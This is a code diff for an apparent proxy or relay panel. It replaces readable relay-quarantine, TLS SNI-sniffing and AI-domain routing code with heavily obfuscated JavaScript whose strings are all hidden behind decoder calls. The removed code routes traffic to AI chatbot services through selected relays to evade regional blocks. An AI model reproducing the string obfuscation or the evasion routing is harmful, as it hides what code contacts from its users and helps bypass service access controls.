+function func_aa(var_gq) {
+  const var_gr = var_gq[func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+  if (var_gr[func_dec(135)] !== 32) return null;
+  const var_gs = var_gr[func_dec(158)](0, 24);
+  const var_gt = parseInt(var_gr[func_dec(158)](24, 32), 16);
+  return {
+    [func_dec(159)]: var_gs,
+    [func_dec(160)]: var_gt
+  };
+}
+function func_ab(var_gu) {
+  if (!var_gu || !var_d[func_dec(75)] || !Array[func_dec(161)](var_d[func_dec(75)])) return false;
+  return var_d[func_dec(75)][func_dec(162)](var_gv => var_gv[func_dec(163)] === var_gu);
+}
+function func_ac(var_gw, var_gx) {
+  const var_gy = var_gw[func_dec(104)][func_dec(150)](func_dec(105)) || func_dec(3);
+  const var_gz = var_gy[func_dec(155)](func_dec(106), func_dec(3)) || func_dec(3);
+  let var_ha = func_dec(3);
+  if (var_gx && typeof var_gx === func_dec(164)) var_ha = var_gx[func_dec(163)] || func_dec(3);
+  return var_gz || var_ha;
+}
+function func_ad(var_hb, var_hc) {
+  try {
+    const var_hd = var_hb && var_hb[func_dec(104)] && var_hb[func_dec(104)][func_dec(150)](func_dec(165)) || func_dec(166);
+    if (func_ck(var_hd)) return false;
+    const var_he = func_ac(var_hb, var_hc);
+    const var_hf = var_he === var_d[func_dec(31)] || func_ab(var_he);
+    if (!var_hf) func_cl(var_hd);
+    return var_hf;
+  } catch (var_hg) {
     return false;
+  }
 }
-async function releaseNahanRunnerLock(env, lease) {
-    try {
-        if (lease && env && env.IOT_DB) {
-            await env.IOT_DB.prepare(
-                "DELETE FROM kv_store WHERE key=? AND value=?",
-            )
-                .bind(lease.lockKey, String(lease.until))
-                .run();
-        }
-    } catch (e) {}
+function func_ae(var_hh) {
+  const var_hi = crypto[func_dec(167)]();
+  const var_hj = func_dec(168) + Date[func_dec(170)]()[func_dec(147)](36) + func_dec(169) + Math[func_dec(171)]()[func_dec(147)](36)[func_dec(145)](2, 10) + func_dec(3);
+  const var_hk = var_hj;
+  return {
+    [func_dec(172)]: var_hi,
+    [func_dec(24)]: var_hh || func_dec(173),
+    [func_dec(163)]: var_hk,
+    [func_dec(174)]: Date[func_dec(170)](),
+    [func_dec(175)]: null
+  };
 }
-function relayKeyOf(tok) {
-    try {
-        let s = String(tok || "").trim();
-        if (!s) return null;
-        s = s.replace(/^[a-zA-Z]+:\/\//, "");
-        if (s.includes("@")) s = s.substring(s.lastIndexOf("@") + 1);
-        const hi = s.indexOf("#");
-        if (hi !== -1) s = s.substring(0, hi).trim();
-        if (!s) return null;
-        if (s.charAt(0) === "[") {
-            const ci = s.indexOf("]");
-            if (ci === -1) return null;
-            const host = s.substring(1, ci).toLowerCase();
-            let port = 443;
-            if (s.length > ci + 1 && s.charAt(ci + 1) === ":") {
-                const p = parseInt(s.substring(ci + 2), 10);
-                if (!isNaN(p) && p >= 1 && p <= 65535) port = p;
+function func_af(var_hl, var_hm, var_hn, var_ho) {
+  if (!var_t) var_t = {
+    [func_dec(67)]: {}
+  };
+  if (!var_t[func_dec(67)]) var_t[func_dec(67)] = {};
+  if (!var_t[func_dec(67)][var_hl]) var_t[func_dec(67)][var_hl] = {
+    [func_dec(17)]: 0,
+    [func_dec(23)]: 0,
+    [func_dec(14)]: 0,
+    [func_dec(22)]: 0,
+    [func_dec(21)]: new Date()[func_dec(19)]()[func_dec(18)](func_dec(20))[0]
+  };
+  let var_hp = var_t[func_dec(67)][var_hl];
+  let var_hq = new Date()[func_dec(19)]()[func_dec(18)](func_dec(20))[0];
+  if (var_hp[func_dec(21)] !== var_hq) {
+    var_hp[func_dec(23)] = 0;
+    var_hp[func_dec(22)] = 0;
+    var_hp[func_dec(21)] = var_hq;
+  }
+  if (var_hp[func_dec(17)] === undefined) var_hp[func_dec(17)] = 0;
+  if (var_hp[func_dec(23)] === undefined) var_hp[func_dec(23)] = 0;
+  if (typeof var_hp[func_dec(14)] !== func_dec(15) || var_hp[func_dec(14)] < 0) var_hp[func_dec(14)] = Math[func_dec(16)]((var_hp[func_dec(17)] || 0) * var_b);
+  if (typeof var_hp[func_dec(22)] !== func_dec(15) || var_hp[func_dec(22)] < 0) var_hp[func_dec(22)] = var_hp[func_dec(21)] === var_hq ? Math[func_dec(16)]((var_hp[func_dec(23)] || 0) * var_b) : 0;
+  if (var_hm === 0) {
+    var_hp[func_dec(17)] += 1;
+    var_hp[func_dec(23)] += 1;
+  } else if (typeof var_hm === func_dec(15) && var_hm > 0) {
+    var_hp[func_dec(14)] += Math[func_dec(16)](var_hm);
+    var_hp[func_dec(22)] += Math[func_dec(16)](var_hm);
+  }
+  const var_hr = Date[func_dec(170)]();
+  if (var_hr - var_u > 30000) {
+    var_u = var_hr;
+    if (var_hn && var_hn[func_dec(126)]) {
+      let var_hs = false;
+      if (var_d[func_dec(67)] && var_d[func_dec(67)][func_dec(135)] > 0) {
+        var_d[func_dec(67)][func_dec(176)](var_ht => {
+          let var_hu = var_ht[func_dec(172)][func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+          let var_hv = var_t[func_dec(67)][var_hu];
+          if (!var_ht[func_dec(57)]) {
+            let var_hw = null;
+            if (var_ht[func_dec(71)] && Date[func_dec(170)]() > var_ht[func_dec(71)]) {
+              var_hw = func_dec(177) + new Date(var_ht[func_dec(71)])[func_dec(179)]() + func_dec(178);
+            } else if (var_hv && var_ht[func_dec(70)] && func_f(var_hv) >= func_h(var_ht[func_dec(70)])) {
+              let var_hx = (func_f(var_hv) / 1073741824)[func_dec(180)](2);
+              let var_hy = (func_h(var_ht[func_dec(70)]) / 1073741824)[func_dec(180)](2);
+              var_hw = func_dec(181) + var_hx + func_dec(182) + var_hy + func_dec(183);
             }
-            if (!host) return null;
-            return { host, port, key: host + "|" + port };
+            if (var_hw) {
+              var_ht[func_dec(57)] = true;
+              var_ht[func_dec(184)] = var_hw;
+              var_ht[func_dec(185)] = Date[func_dec(170)]();
+              var_hs = true;
+              var_ho?.[func_dec(186)](func_al(var_hn, func_dec(188), func_dec(189) + var_ht[func_dec(24)] + func_dec(190) + var_ht[func_dec(172)] + func_dec(191) + var_hw + func_dec(3))[func_dec(187)](() => {}));
+              if (var_d[func_dec(51)] && (var_d[func_dec(53)] || var_d[func_dec(52)])) {
+                const var_hz = func_dec(192) + var_ht[func_dec(24)] + func_dec(193) + var_ht[func_dec(172)] + func_dec(194) + var_hw + func_dec(3);
+                const var_ia = var_d[func_dec(53)] || var_d[func_dec(52)];
+                var_ho?.[func_dec(186)](func_e(func_dec(195) + var_d[func_dec(51)] + func_dec(196), {
+                  [func_dec(123)]: func_dec(197),
+                  [func_dec(104)]: {
+                    [func_dec(198)]: func_dec(121)
+                  },
+                  [func_dec(125)]: JSON[func_dec(119)]({
+                    [func_dec(199)]: var_ia,
+                    [func_dec(200)]: var_hz,
+                    [func_dec(201)]: func_dec(202)
+                  })
+                })[func_dec(187)](() => {}));
+              }
+            }
+          }
+        });
+      }
+      if (var_hs) {
+        var_ho?.[func_dec(186)](func_t(var_hn, func_dec(138), JSON[func_dec(119)](var_d))[func_dec(187)](() => {}));
+      }
+      var_ho?.[func_dec(186)](func_t(var_hn, func_dec(139), JSON[func_dec(119)](var_t))[func_dec(187)](() => {}));
+    }
+  }
+}
+export default {
+  [func_dec(203)]: async function (var_ib, var_ic, var_id) {
+    try {
+      if (!var_e) var_e = Date[func_dec(170)]();
+      try {
+        var_g++;
+      } catch (var_ip) {}
+      if (var_s[func_dec(204)] > 10000) {
+        var_s[func_dec(205)]();
+        var_ac[func_dec(205)]();
+      }
+      await func_ai(var_ic, var_id);
+      try {
+        const var_iq = Date[func_dec(170)]();
+        if (var_iq - var_at > 60000) {
+          var_at = var_iq;
+          if (var_id && typeof var_id[func_dec(186)] === func_dec(94)) {
+            var_id[func_dec(186)]((async () => {
+              try {
+                await func_ce(var_ic);
+              } catch (var_ir) {}
+              try {
+                await func_ci(var_ic);
+              } catch (var_is) {}
+            })());
+          }
         }
-        const firstColon = s.indexOf(":");
-        const lastColon = s.lastIndexOf(":");
-        if (firstColon !== -1 && firstColon !== lastColon) {
-            const host = s.toLowerCase();
-            if (!host || host.length > 253) return null;
-            return { host, port: 443, key: host + "|443" };
-        }
-        let host = s;
-        let port = 443;
-        if (lastColon !== -1) {
-            const tail = s.substring(lastColon + 1).trim();
-            if (/^\d+$/.test(tail)) {
-                const p = parseInt(tail, 10);
-                if (!isNaN(p) && p >= 1 && p <= 65535) {
-                    host = s.substring(0, lastColon);
-                    port = p;
-                } else {
-                    return null;
-                }
+      } catch (var_it) {}
+      var_r = var_d[func_dec(37)] || func_cp(var_d[func_dec(25)]);
+      const var_ie = new URL(var_ib[func_dec(206)]);
+      const var_if = var_ib[func_dec(104)][func_dec(150)](func_dec(207));
+      const var_ig = var_if && var_if[func_dec(154)]() === func_dec(208);
+      let var_ih = var_ie[func_dec(209)];
+      if (var_ih[func_dec(210)](func_dec(211)) && var_ih[func_dec(135)] > 1) var_ih = var_ih[func_dec(145)](0, -1);
+      const var_ii = {
+        [func_dec(212)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(3),
+        [func_dec(213)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(214),
+        [func_dec(215)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(216),
+        [func_dec(26)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(217),
+        [func_dec(218)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(219),
+        [func_dec(220)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(221),
+        [func_dec(222)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(223),
+        [func_dec(67)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(224),
+        [func_dec(225)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(226),
+        [func_dec(227)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(228),
+        [func_dec(229)]: func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(230)
+      };
+      const var_ij = var_ih[func_dec(210)](func_dec(217));
+      const var_ik = var_ih === var_ii[func_dec(67)] || var_ih[func_dec(210)](func_dec(224));
+      const var_il = var_ih === var_ii[func_dec(225)] || var_ih[func_dec(210)](func_dec(226));
+      const var_im = var_ih === var_ii[func_dec(227)] || var_ih[func_dec(210)](func_dec(228));
+      const var_in = var_ih === var_ii[func_dec(229)] || var_ih[func_dec(210)](func_dec(230));
+      const var_io = var_ih === var_ii[func_dec(212)] || var_ih === var_ii[func_dec(213)] || var_ih === var_ii[func_dec(215)] || var_ih === var_ii[func_dec(26)] || var_ih === var_ii[func_dec(218)] || var_ih === var_ii[func_dec(220)] || var_ih === var_ii[func_dec(222)] || var_ij || var_ik || var_il || var_im || var_in;
+      if (!var_ig && !var_io) {
+        return func_ag(var_ib, var_ie);
+      }
+      if (var_d[func_dec(87)] && (var_ig || var_ih === var_ii[func_dec(212)])) {
+        if (var_ig) return new Response(null, {
+          [func_dec(231)]: 503
+        });
+        return new Response(func_dec(232), {
+          [func_dec(231)]: 503,
+          [func_dec(104)]: {
+            [func_dec(233)]: func_dec(234)
+          }
+        });
+      }
+      if (!var_ig) {
+        if (var_ih === var_ii[func_dec(213)]) {
+          const var_iu = var_ic[func_dec(235)] || func_dec(236);
+          try {
+            const var_iv = await func_e(var_iu);
+            let var_iw = await var_iv[func_dec(200)]();
+            var_iw = var_iw[func_dec(155)](new RegExp(func_dec(237), func_dec(157)), var_a);
+            if (var_ic[func_dec(126)] !== undefined) {
+              var_iw = var_iw[func_dec(155)](func_dec(238), func_dec(3));
             } else {
-                return null;
+              var_iw = var_iw[func_dec(155)](func_dec(238), func_dec(239));
             }
+            return new Response(var_iw, {
+              [func_dec(104)]: {
+                [func_dec(198)]: func_dec(240)
+              }
+            });
+          } catch (var_ix) {
+            return new Response(func_dec(241), {
+              [func_dec(231)]: 502
+            });
+          }
         }
-        host = host.toLowerCase();
-        if (!host || host.length > 253) return null;
-        if (!/^[a-z0-9.\-]+$/.test(host)) return null;
-        return { host, port, key: host + "|" + port };
-    } catch (e) {
-        return null;
-    }
-}
-function isRelayQuarantined(host, port) {
-    try {
-        const e = RELAY_Q.get(
-            String(host || "").toLowerCase() + "|" + (port || 443),
-        );
-        if (!e || !e.until) return false;
-        if (Date.now() > e.until) {
-            RELAY_Q.delete(
-                String(host || "").toLowerCase() + "|" + (port || 443),
-            );
-            return false;
+        if (var_ih === var_ii[func_dec(215)]) {
+          if (var_ib[func_dec(123)] !== func_dec(197)) return new Response(func_dec(242), {
+            [func_dec(231)]: 405
+          });
+          return await func_au(var_ib, var_ie[func_dec(243)], var_id, var_ic);
         }
-        return true;
-    } catch (err) {
-        return false;
-    }
-}
-function recordRelaySuccess(host, port, full) {
-    try {
-        const k =
-            String(host || "").toLowerCase() + "|" + (port || 443);
-        const e = RELAY_Q.get(k);
-        if (!e) return;
-        e.fail = 0;
-        if (full) {
-            e.probeFail = 0;
-            e.until = 0;
-            if (!e.fail && !e.probeFail) RELAY_Q.delete(k);
+        if (var_ih === var_ii[func_dec(26)] || var_ij) {
+          if (var_ib[func_dec(123)] === func_dec(244)) {
+            return new Response(null, {
+              [func_dec(231)]: 204,
+              [func_dec(104)]: {
+                [func_dec(245)]: func_dec(246),
+                [func_dec(247)]: func_dec(248),
+                [func_dec(249)]: func_dec(250),
+                [func_dec(251)]: func_dec(252)
+              }
+            });
+          }
+          if (var_ib[func_dec(123)] !== func_dec(197)) return new Response(func_dec(242), {
+            [func_dec(231)]: 405
+          });
+          const var_iy = await func_av(var_ib, var_ic, var_id);
+          var_iy[func_dec(104)][func_dec(151)](func_dec(245), func_dec(246));
+          var_iy[func_dec(104)][func_dec(151)](func_dec(249), func_dec(250));
+          return var_iy;
         }
-    } catch (err) {}
-}
-function recordRelayFailure(host, port) {
-    try {
-        const k =
-            String(host || "").toLowerCase() + "|" + (port || 443);
-        let e = RELAY_Q.get(k);
-        if (!e) {
-            e = { fail: 0, until: 0, probeFail: 0 };
-            RELAY_Q.set(k, e);
+        if (var_ih === var_ii[func_dec(222)]) {
+          if (var_ib[func_dec(123)] !== func_dec(197) && var_ib[func_dec(123)] !== func_dec(253)) return new Response(func_dec(242), {
+            [func_dec(231)]: 405
+          });
+          return await func_am(var_ib, var_ic);
         }
-        e.fail = (e.fail || 0) + 1;
-        if (e.fail >= RELAY_FAIL_STREAK) {
-            const alreadyOut =
-                e.until && e.until > Date.now() ? true : false;
-            e.until = Date.now() + RELAY_QUARANTINE_MS;
-            // Log only the transition into quarantine, not every failure
-            // afterwards (a dead relay under a reconnect storm would
-            // otherwise spam the log on every single connection).
-            if (!alreadyOut) {
-                try {
-                    console.error(
-                        "relay-quarantined: " + k + " (" + e.fail + " fails)",
-                    );
-                } catch (err) {}
+        if (var_ik) {
+          return await func_an(var_ib, var_ic, var_id);
+        }
+        if (var_il) {
+          return await func_aq(var_ib, var_ic);
+        }
+        if (var_im) {
+          return await func_as(var_ib, var_ic, var_id);
+        }
+        if (var_in) {
+          return await func_at(var_ib, var_ic, var_id);
+        }
+        if (var_ih === var_ii[func_dec(220)]) {
+          if (var_ib[func_dec(123)] !== func_dec(197)) return new Response(func_dec(242), {
+            [func_dec(231)]: 405
+          });
+          return await func_aw(var_ib, var_ic, var_id);
+        }
+        if (var_ih === var_ii[func_dec(218)]) {
+          if (var_ib[func_dec(123)] !== func_dec(197)) return new Response(func_dec(242), {
+            [func_dec(231)]: 405
+          });
+          return await func_bg(var_ib, var_ic, var_ie[func_dec(243)], var_id);
+        }
+        if (var_ih === var_ii[func_dec(212)]) {
+          const var_iz = (var_ib[func_dec(104)][func_dec(150)](func_dec(254)) || func_dec(3))[func_dec(154)]();
+          const var_ja = var_d[func_dec(68)] && var_d[func_dec(68)][func_dec(255)]()[func_dec(135)] > 0 && var_iz[func_dec(256)](var_d[func_dec(68)][func_dec(255)]()[func_dec(154)]());
+          const var_jb = var_ib[func_dec(104)][func_dec(150)](func_dec(257)) || var_ie[func_dec(243)];
+          let var_jc = var_ie[func_dec(258)][func_dec(150)](func_dec(259));
+          let var_jd = var_d[func_dec(67)] && var_d[func_dec(67)][func_dec(135)] > 0;
+          let var_je = null;
+          let var_jf = false;
+          if (var_jd) {
+            if (var_jc) {
+              var_je = var_d[func_dec(67)][func_dec(260)](var_jq => var_jq[func_dec(24)][func_dec(154)]() === var_jc[func_dec(154)]() || var_jq[func_dec(172)] === var_jc);
+              if (var_je) var_jf = true;
             }
-        }
-        if (RELAY_Q.size > 2000) RELAY_Q.clear();
-    } catch (err) {}
-}
-// ==== Per-SNI AI quarantine (same as Sepidar agency-wide): a relay that
-// fails only for a specific SNI (e.g. Google) must not die for all traffic.
-// Memory-only (zero D1 writes): 3 AI-traffic fails in a row = 30min quarantine
-// for AI traffic only. Expiry = automatic re-test; AI success clears it.
-// The chain never ends up empty (fallback keeps the original list).
-const AI_RELAY_Q = new Map();
-const AI_FAIL_STREAK = 3;
-const AI_QUARANTINE_MS = 30 * 60 * 1000;
-function isAiQuarantined(host, port) {
-    try {
-        const k =
-            String(host || "").toLowerCase() + "|" + (port || 443);
-        const e = AI_RELAY_Q.get(k);
-        if (!e) return false;
-        if (e.until) {
-            if (Date.now() < e.until) return true;
-            try {
-                AI_RELAY_Q.delete(k);
-            } catch (err) {}
-            return false;
-        }
-        // Still counting fails (until=0): never delete here or the streak
-        // could never reach the limit (checked on every AI connection).
-        return false;
-    } catch (err) {
-        return false;
-    }
-}
-function recordAiFailure(host, port) {
-    try {
-        if (AI_RELAY_Q.size > 500) {
-            const now0 = Date.now();
-            for (const [kk, vv] of AI_RELAY_Q) {
-                if (!vv || !vv.until || vv.until <= now0) {
-                    try {
-                        AI_RELAY_Q.delete(kk);
-                    } catch (e) {}
+          } else {
+            var_jf = true;
+            var_je = {
+              [func_dec(172)]: var_r,
+              [func_dec(24)]: func_dec(261)
+            };
+          }
+          const var_jg = (var_ib[func_dec(104)][func_dec(150)](func_dec(262)) || func_dec(3))[func_dec(154)]();
+          const var_jh = (var_ib[func_dec(104)][func_dec(150)](func_dec(263)) || func_dec(3))[func_dec(154)]();
+          const var_ji = (var_jh === func_dec(264) || var_jg[func_dec(256)](func_dec(265))) && (var_iz[func_dec(256)](func_dec(266)) || var_iz[func_dec(256)](func_dec(41)) || var_iz[func_dec(256)](func_dec(267)) || var_iz[func_dec(256)](func_dec(268)) || var_iz[func_dec(256)](func_dec(269)) || var_iz[func_dec(256)](func_dec(270)) || var_iz[func_dec(256)](func_dec(271))) && !var_iz[func_dec(256)](func_dec(272) + func_dec(273)) && !var_iz[func_dec(256)](func_dec(274) + func_dec(275)) && !var_iz[func_dec(256)](func_dec(276) + func_dec(277) + func_dec(278)) && !var_iz[func_dec(256)](func_dec(279) + func_dec(280)) && !var_iz[func_dec(256)](func_dec(281) + func_dec(282)) && !var_iz[func_dec(256)](func_dec(283) + func_dec(284)) && !var_iz[func_dec(256)](func_dec(285) + func_dec(273));
+          if (var_ji && !var_ja) {
+            if (var_jf) {
+              const var_jr = var_ic[func_dec(286)] || func_dec(287);
+              try {
+                const var_js = await func_e(var_jr);
+                let var_jt = await var_js[func_dec(200)]();
+                const var_ju = var_je[func_dec(172)][func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+                const var_jv = var_t?.[func_dec(67)]?.[var_ju] || {
+                  [func_dec(17)]: 0,
+                  [func_dec(23)]: 0,
+                  [func_dec(21)]: func_dec(3)
+                };
+                const var_jw = var_jv[func_dec(17)] || 0;
+                const var_jx = new Date()[func_dec(19)]()[func_dec(18)](func_dec(20))[0];
+                const var_jy = var_jv[func_dec(21)] === var_jx ? var_jv[func_dec(23)] || 0 : 0;
+                const var_jz = var_je[func_dec(70)] || 0;
+                const var_ka = var_je[func_dec(288)] || 0;
+                const var_kb = func_f(var_jv);
+                const var_kc = func_g(var_jv, var_jx);
+                const var_kd = func_h(var_jz);
+                const var_ke = func_h(var_ka);
+                const var_kf = (var_kb / 1073741824)[func_dec(180)](2);
+                const var_kg = var_jz ? (var_kd / 1073741824)[func_dec(180)](2) : func_dec(289);
+                const var_kh = (var_kc / 1073741824)[func_dec(180)](2);
+                const var_ki = var_ka ? (var_ke / 1073741824)[func_dec(180)](2) : func_dec(289);
+                const var_kj = var_jz ? Math[func_dec(290)](100, var_kb / var_kd * 100)[func_dec(180)](1) : func_dec(148);
+                const var_kk = var_ka ? Math[func_dec(290)](100, var_kc / var_ke * 100)[func_dec(180)](1) : func_dec(148);
+                let var_kl = func_dec(291);
+                let var_km = false;
+                if (var_je[func_dec(71)]) {
+                  var_kl = new Date(var_je[func_dec(71)])[func_dec(19)]()[func_dec(18)](func_dec(20))[0];
+                  if (Date[func_dec(170)]() > var_je[func_dec(71)]) var_km = true;
                 }
-                if (AI_RELAY_Q.size <= 400) break;
-            }
-        }
-        const k =
-            String(host || "").toLowerCase() + "|" + (port || 443);
-        const now = Date.now();
-        const e = AI_RELAY_Q.get(k) || { fail: 0, until: 0 };
-        if (e.until && now < e.until) return;
-        e.fail++;
-        if (e.fail >= AI_FAIL_STREAK) {
-            e.until = now + AI_QUARANTINE_MS;
-            e.fail = 0;
-            try {
-                console.error("relay-ai-quarantined: " + k);
-            } catch (err) {}
-        }
-        AI_RELAY_Q.set(k, e);
-    } catch (err) {}
-}
-function recordAiSuccess(host, port) {
-    try {
-        AI_RELAY_Q.delete(
-            String(host || "").toLowerCase() + "|" + (port || 443),
-        );
-    } catch (err) {}
-}
-// Token-string variant: Nahan chains carry "IP[:port][#Name]" strings.
-function filterAiQuarantinedTokens(list) {
-    // Fail-closed: a known-bad relay must not be reintroduced merely
-    // because the healthy set is empty. Empty means explicit failure.
-    try {
-        return (list || []).filter((t) => {
-            const rk = relayKeyOf(t);
-            if (!rk) return true;
-            return !isAiQuarantined(rk.host, rk.port);
-        });
-    } catch (e) {
-        return [];
-    }
-}
-function filterQuarantinedRelays(list) {
-    // Fail-closed: see above.
-    try {
-        return (list || []).filter((t) => {
-            const rk = relayKeyOf(t);
-            if (!rk) return true;
-            return !isRelayQuarantined(rk.host, rk.port);
-        });
-    } catch (e) {
-        return [];
-    }
-}
-// ==== AI smart egress (same structure as Sepidar panel) ====
-// Gemini/ChatGPT-class endpoints often reject datacenter egress (or
-// blocked-country egress), so AI traffic prefers relays explicitly flagged
-// `#AI` (clean-country relays). List shared with Sepidar for agency-wide
-// consistent behavior. Plain google.com is intentionally NOT listed.
-const AI_LLM_SUFFIXES = [
-    "gemini.google.com",
-    "generativelanguage.googleapis.com",
-    "ai.google.dev",
-    "bard.google.com",
-    "openai.com",
-    "chatgpt.com",
-    "anthropic.com",
-    "claude.ai",
-    "copilot.microsoft.com",
-    "bing.com",
-    "meta.ai",
-    "x.ai",
-    "grok.com",
-    "deepseek.com",
-    "perplexity.ai",
-    "poe.com",
-    "character.ai",
-    "you.com",
-    "mistral.ai",
-    "chat.mistral.ai",
-];
-function isAiDomain(d) {
-    try {
-        const v = String(d || "")
-            .toLowerCase()
-            .replace(/\.$/, "")
-            .trim();
-        if (!v || v.length > 253) return false;
-        for (const sfx of AI_LLM_SUFFIXES) {
-            if (v === sfx || v.endsWith("." + sfx)) return true;
-        }
-        return false;
-    } catch (e) {
-        return false;
-    }
-}
-// TLS SNI sniffing (pure, bounds-checked): extracts the Server Name from a
-// ClientHello so IP-literal destinations can still be classified. Returns
-// the hostname or null. Never throws.
-function sniffSniFromHello(data) {
-    try {
-        const raw =
-            data instanceof Uint8Array ? data : new Uint8Array(data || []);
-        if (!raw || raw.byteLength <= 43) return null;
-        if (raw[0] !== 0x16 || raw[5] !== 0x01) return null;
-        let pos = 43;
-        if (pos + 1 > raw.byteLength) return null;
-        const sessionIdLen = raw[pos];
-        pos += 1 + sessionIdLen;
-        if (pos + 2 > raw.byteLength) return null;
-        const cipherSuitesLen = (raw[pos] << 8) | raw[pos + 1];
-        pos += 2 + cipherSuitesLen;
-        if (pos + 1 > raw.byteLength) return null;
-        const compMethodsLen = raw[pos];
-        pos += 1 + compMethodsLen;
-        if (pos + 2 > raw.byteLength) return null;
-        const extensionsLen = (raw[pos] << 8) | raw[pos + 1];
-        pos += 2;
-        const endPos = Math.min(pos + extensionsLen, raw.byteLength);
-        while (pos + 4 <= endPos) {
-            const extType = (raw[pos] << 8) | raw[pos + 1];
-            const extLen = (raw[pos + 2] << 8) | raw[pos + 3];
-            pos += 4;
-            if (extType === 0x0000) {
-                if (pos + 2 > raw.byteLength) return null;
-                const sniPos = pos + 2;
-                if (raw[sniPos] === 0x00) {
-                    if (sniPos + 3 > raw.byteLength) return null;
-                    const sniLen =
-                        (raw[sniPos + 1] << 8) | raw[sniPos + 2];
-                    if (sniLen <= 0 || sniLen > 253) return null;
-                    if (sniPos + 3 + sniLen > raw.byteLength) return null;
-                    try {
-                        return new TextDecoder().decode(
-                            raw.slice(sniPos + 3, sniPos + 3 + sniLen),
-                        );
-                    } catch (e) {
-                        return null;
-                    }
+                let var_kn = func_dec(292);
+                if (var_je[func_dec(57)]) var_kn = func_dec(293);else if (var_km) var_kn = func_dec(294);else if (var_jz && var_kb >= var_kd) var_kn = func_dec(295);else if (var_ka && var_kc >= var_ke) var_kn = func_dec(296);
+                let var_ko = new URL(var_ie[func_dec(297)]);
+                let var_kp = var_d[func_dec(69)];
+                if (var_je[func_dec(298)] && var_je[func_dec(298)][func_dec(255)]()) var_kp = var_je[func_dec(298)][func_dec(255)]();
+                if (var_kp) {
+                  let var_ku = var_kp;
+                  if (!var_ku[func_dec(299)](func_dec(300)) && !var_ku[func_dec(299)](func_dec(301))) var_ku = func_dec(301) + var_ku;
+                  try {
+                    const var_kv = new URL(var_ku);
+                    var_ko[func_dec(302)] = var_kv[func_dec(302)];
+                    var_ko[func_dec(303)] = var_kv[func_dec(303)];
+                  } catch (var_kw) {}
                 }
-                return null;
+                var_ko[func_dec(258)][func_dec(304)](func_dec(305));
+                var_ko[func_dec(258)][func_dec(304)](func_dec(306));
+                var_ko[func_dec(258)][func_dec(304)](func_dec(120));
+                var_ko[func_dec(258)][func_dec(304)](func_dec(307));
+                var_ko[func_dec(258)][func_dec(304)](func_dec(308));
+                const var_kq = var_ko[func_dec(297)];
+                const var_kr = var_ko[func_dec(297)] + (var_ko[func_dec(297)][func_dec(256)](func_dec(309)) ? func_dec(310) : func_dec(311));
+                let var_ks = func_dec(3);
+                if (var_jz) {
+                  var_ks = func_dec(312) + var_kj + func_dec(313) + var_kj + func_dec(314);
+                } else {
+                  var_ks = func_dec(315);
+                }
+                let var_kt = func_dec(3);
+                if (var_ka) {
+                  var_kt = func_dec(316) + var_kk + func_dec(313) + var_kk + func_dec(314);
+                } else {
+                  var_kt = func_dec(317);
+                }
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(318), func_dec(157)), var_je[func_dec(24)]);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(319), func_dec(157)), var_je[func_dec(172)]);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(320), func_dec(157)), var_kn);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(321), func_dec(157)), var_kf);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(322), func_dec(157)), var_kg);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(323), func_dec(157)), var_kj);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(324), func_dec(157)), var_kh);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(325), func_dec(157)), var_ki);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(326), func_dec(157)), var_kk);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(327), func_dec(157)), var_kl);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(328), func_dec(157)), var_kq);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(329), func_dec(157)), var_kr);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(330), func_dec(157)), var_ks);
+                var_jt = var_jt[func_dec(155)](new RegExp(func_dec(331), func_dec(157)), var_kt);
+                return new Response(var_jt, {
+                  [func_dec(104)]: {
+                    [func_dec(198)]: func_dec(332)
+                  }
+                });
+              } catch (var_kx) {
+                return new Response(func_dec(333), {
+                  [func_dec(231)]: 502
+                });
+              }
+            } else {
+              return func_ag(var_ib, var_ie);
             }
-            pos += extLen;
+          }
+          if (var_jd && !var_jf) {
+            return new Response(func_dec(334), {
+              [func_dec(231)]: 403
+            });
+          }
+          try {
+            if (func_i() >= 2 && !var_ji) {
+              return new Response(func_dec(335), {
+                [func_dec(231)]: 429,
+                [func_dec(104)]: {
+                  [func_dec(233)]: func_dec(336)
+                }
+              });
+            }
+          } catch (var_ky) {}
+          const var_jj = var_ie[func_dec(258)][func_dec(150)](func_dec(337)) === func_dec(338) || var_ie[func_dec(258)][func_dec(150)](func_dec(339)) === func_dec(338) || var_ie[func_dec(258)][func_dec(150)](func_dec(340)) === func_dec(341) || var_ie[func_dec(258)][func_dec(150)](func_dec(339)) === func_dec(341);
+          const var_jk = new Headers();
+          var_jk[func_dec(151)](func_dec(342), func_dec(343));
+          var_jk[func_dec(151)](func_dec(245), func_dec(246));
+          let var_jl = (var_ie[func_dec(258)][func_dec(150)](func_dec(305)) || var_ie[func_dec(258)][func_dec(150)](func_dec(306)) || var_ie[func_dec(258)][func_dec(150)](func_dec(120)) || var_ie[func_dec(258)][func_dec(150)](func_dec(307)) || func_dec(3))[func_dec(154)]();
+          if (var_jf && var_je) {
